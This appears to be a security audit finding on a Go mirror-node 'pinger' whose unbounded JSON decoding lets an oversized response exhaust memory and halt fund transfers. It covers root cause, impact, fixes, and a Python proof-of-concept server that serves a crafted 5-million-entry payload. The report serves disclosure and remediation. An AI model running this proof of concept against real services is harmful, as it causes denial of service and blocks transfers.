### Title
Unbounded Mirror-Node Response Causes Resource Exhaustion in `fetchMirrorNodeNetwork`, Blocking `newClient` and Halting Fund Transfers

### Summary
`fetchMirrorNodeNetwork` in `pinger/mirror_node_client.go` decodes the mirror node REST response directly into memory with no body-size cap and iterates over all returned nodes and service endpoints with no count limit. An attacker who can influence the mirror node REST response (e.g., via HTTP MITM, DNS poisoning, or a compromised mirror node) can serve a crafted oversized `nodesEnvelope`, causing unbounded memory allocation and CPU consumption that blocks `newClient` from completing and prevents fund transfers for as long as the attack is sustained.

### Finding Description
**Exact code path:**

`pinger/sdk_client.go` → `newClient()` (line 18) calls `buildNetworkFromMirrorNodes()` → which calls `fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go`.

**Root cause — two missing guards:**

1. **No response body size limit** (line 96):
   ```go
   if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
   ```
   `resp.Body` is decoded directly with no `io.LimitReader`. The entire response body is read into a `nodesEnvelope` struct in memory before any processing occurs.

2. **Unbounded loop over nodes and endpoints** (lines 102–124):
   ```go
   for _, n := range payload.Nodes {
       ...
       for _, ep := range n.ServiceEndpoints {
           ...
           network[addr] = nodeAccountId
       }
   }
   ```
   No cap on `len(payload.Nodes)` or `len(n.ServiceEndpoints)`. A response with N nodes × M endpoints causes N×M map insertions, each allocating a string key.

**Failed assumption:** The code assumes the mirror node REST endpoint is trusted and will return a small, well-formed response. No validation of response size or entry count is performed.

**Exploit flow:**
- Attacker intercepts or replaces the HTTP response from the mirror node REST endpoint.
- Returns a JSON body with e.g. 50,000 `nodes` entries, each with 100 `service_endpoints` (5,000,000 map entries).
- `json.Decode` allocates the full struct in heap memory; the nested loop then inserts 5M string→AccountID pairs into `network`.
- The goroutine running `newClient` is blocked for the duration of this allocation/processing.
- `buildNetworkFromMirrorNodes` retries up to `mirrorNodeClientMaxRetries+1` times (default 11), multiplying the resource consumption.
- The pinger never successfully initializes its `hiero.Client` and never executes any fund transfer.

**Why the HTTP timeout is insufficient:**
`http.Client{Timeout: cfg.mirrorNodeClientTimeout}` (default 10 s, line 46) bounds the HTTP read phase. However, on a fast local/internal network, an attacker can deliver hundreds of megabytes within 10 seconds. Once `resp.Body` is fully read, `json.Decode` and the map-construction loop run without any deadline. The context passed in (`context.Background()`) carries no cancellation tied to the HTTP timeout.

### Impact Explanation
- **Memory exhaustion:** A 200 MB JSON payload (easily deliverable in 10 s on LAN) allocates a proportional heap; repeated retries (×11 by default) multiply peak RSS.
- **CPU spike:** JSON tokenization and 5M+ map insertions are CPU-intensive; on resource-constrained deployments this can saturate available cores.
- **Fund transfer halt:** `newClient` never returns a valid client; the pinger loop never executes transfers. As long as the attacker sustains the attack (continuously serving malicious responses), fund transfers are permanently blocked.
- **No self-healing:** There is no circuit-breaker, no fallback network, and no watchdog that restarts the client with a cached/previous network map.

### Likelihood Explanation
- **HTTP deployments:** `cfg.mirrorRest` accepts any URL including plain `http://`. Internal deployments commonly use unencrypted HTTP for mirror node REST. A network-adjacent attacker (same LAN/VLAN, rogue switch, ARP spoofing) can MITM without any credentials.
- **DNS poisoning:** If `cfg.mirrorRest` uses a hostname, an external attacker with DNS influence can redirect the pinger to a malicious server — no privileged access to the mirror node required.
- **Repeatability:** The attack is trivially repeatable; the attacker simply keeps serving the oversized response on every retry cycle.
- **No authentication on the REST call:** The GET to `/api/v1/network/nodes` carries no HMAC, token, or TLS client certificate that would allow the pinger to detect a spoofed response.

### Recommendation
1. **Limit response body size** before decoding:
   ```go
   const maxBodyBytes = 1 << 20 // 1 MB
   limited := io.LimitReader(resp.Body, maxBodyBytes+1)
   body, err := io.ReadAll(limited)
   if len(body) > maxBodyBytes {
       return nil, false, fmt.Errorf("mirror node response exceeds size limit")
   }
   if err := json.Unmarshal(body, &payload); err != nil { ... }
   ```
2. **Cap node and endpoint counts** after decoding:
   ```go
   const maxNodes = 200
   const maxEndpointsPerNode = 10
   if len(payload.Nodes) > maxNodes { payload.Nodes = payload.Nodes[:maxNodes] }
   ```
3. **Propagate context deadlines** through the decode phase by wrapping `resp.Body` with a deadline-aware reader or using `context.WithTimeout` around the entire fetch-and-decode block.
4. **Enforce TLS** for the mirror node REST URL and validate the server certificate to prevent MITM.

### Proof of Concept
```python
# Attacker-controlled HTTP server (Python)
import json, socket, threading

def handle(conn):
    conn.recv(4096)  # consume the GET request
    nodes = []
    for i in range(50000):
        nodes.append({
            "node_account_id": f"0.0.{i+3}",
            "service_endpoints": [
                {"domain_name": f"node{i}-ep{j}.example.com",
                 "ip_address_v4": "", "port": 50211}
                for j in range(100)
            ],
            "grpc_proxy_endpoint": None
        })
    body = json.dumps({"nodes": nodes, "links": {"next": None}}).encode()
    header = (
        f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode()
    conn.sendall(header + body)
    conn.close()

s = socket.socket(); s.bind(("0.0.0.0", 5551)); s.listen(5)
while True:
    threading.Thread(target=handle, args=(s.accept()[0],)).start()
```
1. Run the server above (or MITM the real mirror node REST endpoint).
2. Set `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551`.
3. Start the pinger. Observe: `newClient` blocks for the full retry budget (11 × 10 s = ~110 s), RSS grows to several GB, no transfers are ever submitted.
4. While the server is running, the pinger never recovers — fund transfers are permanently halted.